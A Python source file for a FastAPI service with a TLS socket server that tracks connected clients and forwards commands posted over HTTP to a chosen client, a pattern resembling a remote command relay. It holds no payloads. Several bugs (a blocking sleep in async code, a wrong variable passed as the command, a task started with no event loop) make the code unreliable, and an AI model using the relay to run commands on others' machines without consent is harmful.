import ssl
import asyncio
import logging
import sys
import time
from typing import Dict, Tuple

from fastapi import FastAPI

from src.rabbitmq.rabbitmqinterface import RabbitMQInterface
from src.utils import send_log, send_command

app = FastAPI()

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

HOST = "0.0.0.0"
PORT = 8000


class Server:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.connections: Dict[str, asyncio.StreamWriter] = {}
        self.rmq_interface = RabbitMQInterface()
        self.context = self._ssl_context()

    @staticmethod
    def _ssl_context() -> ssl.SSLContext:
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile="server.crt", keyfile="server.key")
        return context

    async def heartbeats(self):
        while True:
            time.sleep(10)
            alive = {}
            for addr, writer in self.connections.items():
                writer.write(b"heartbeat")

    async def handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        addr = writer.get_extra_info('peername')  # get ip
        self.connections[str(addr)] = writer
        send_log(f"Received connection from client {addr}", self, "debug")

        try:
            while True:
                data = await reader.read(1024)
                if not data:
                    break
                message = data.decode()
                send_log(f"Received from {addr}: {message}", self, "debug")

                if "command" in message:
                    send_command(command, self)

        except Exception as e:
            send_log(f"Error with client {addr}: {e}", self, "debug")

        finally:
            writer.close()
            await writer.wait_closed()
            del self.connections[str(addr)]
            send_log(f"Connection closed for {addr}", self, "debug")

    async def start_server(self):
        await self.rmq_interface.connect()
        server = await asyncio.start_server(
            self.handle_client, self.host, self.port, ssl=self.context
        )
        send_log(f"Server listening on {self.host}:{self.port}", self, "debug")
        async with server:
            await server.serve_forever()

    def send_command_client(self, command: str):
        cmd, addr, rest = self._digest_command(command)
        if addr not in self.connections:
            send_command(f"Received bad command: {command}, client does not exist.")
            return
        writer = self.connections[addr]
        writer.write(" ".join([cmd, rest]).encode())
        asyncio.create_task(writer.drain())

    def get_clients(self):
        return list(self.connections.keys())

    @staticmethod
    def _digest_command(command) -> Tuple[str, str, str]:
        try:
            parts = command.split(" ")
            cmd = parts[0]
            addr = parts[1]
            rest = " ".join(parts[2:])
            return cmd, addr, rest
        except Exception:
            send_command(f"Received bad command: {command}, invalid format.")


server = Server(HOST, PORT)
asyncio.create_task(server.start_server())


@app.post("/command", status_code=200)
def command(cmd: str):
    logger.debug(f"Received: {cmd}")
    if cmd == "display clients":
        return {"result": server.get_clients()}
    return {"result": server.send_command_client(cmd)}
